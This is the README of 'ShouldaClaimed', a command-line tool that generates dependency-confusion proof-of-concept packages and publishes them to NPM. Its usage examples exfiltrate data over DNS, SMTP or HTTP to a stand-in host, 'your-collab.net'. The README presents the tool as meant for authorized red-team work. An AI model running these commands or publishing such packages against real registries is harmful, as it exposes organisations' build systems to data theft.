# ShouldaClaimed

A CLI tool for generating and publishing Dependency Confusion Proof-of-Concepts (POCs) to NPM.

## Install

```bash
go install github.com/A3-N/ShouldaClaimed@latest
```

## Usage

### Create Payload (No Publish)

Generate a package to inspect the code or publish manually later.

**DNS Exfiltration (Chunked High-Bandwidth):**
```bash
ShouldaClaimed create -t internal-utils -p dns -s your-collab.net
```

**SMTP Exfiltration (Port Configurable):**
```bash
ShouldaClaimed create -t internal-utils -p smtp -s your-collab.net:587
```

**HTTP Exfiltration:**
```bash
ShouldaClaimed create -t internal-utils -p http -s http://your-collab.net
```

### Create & Publish

Generates the package, handles authentication, and publishes to the NPM registry.

```bash
ShouldaClaimed publish -t internal-utils -p dns -s your-collab.net
```

### Flags

| Flag | Description |
|---|---|
| `-t`, `--target` | **Required.** Target package name. |
| `-p`, `--poc` | POC Type: `dns`, `smtp`, `http`. |
| `-s`, `--server` | Exfiltration server (e.g. `collab.net` or `http://...`). |
| `-o`, `--out` | Output directory (default: `.`). |
| `-f`, `--force` | Skip pre-flight checks (NPM installed? Package exists?). |

## Intent

This tool is designed for authorized security testing and Red Teaming engagements to demonstrate the impact of Dependency Confusion vulnerabilities.
